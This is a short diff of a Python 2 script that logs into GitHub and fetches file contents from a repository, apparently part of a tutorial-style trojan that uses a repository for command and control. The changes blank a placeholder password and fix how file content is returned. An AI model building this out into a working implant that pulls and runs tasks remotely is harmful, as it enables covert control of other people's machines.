@@ -2,7 +2,7 @@
 # @Author: test
 # @Date:   2017-01-19 12:53:02
 # @Last Modified by:   test
-# @Last Modified time: 2017-01-19 13:44:36
+# @Last Modified time: 2017-01-19 14:02:54
 import json
 import base64
 import sys
@@ -25,7 +25,7 @@ task_queue = Queue.Queue()
 
 
 def connect_github():
-    gh = login(username='username', password='pwd')
+    gh = login(username='username', password='')
     repo = gh.repository('username', 'toy')
     branch = repo.branch('master')
 
@@ -40,7 +40,7 @@ def get_file_contents(filepath):
         if filepath in filename.path:
             print '[*] Found file %s' % filepath
             blob = repo.blob(filename._json_data['sha'])
-            return blob.get_file_contents
+            return blob.content
 
     return None
 
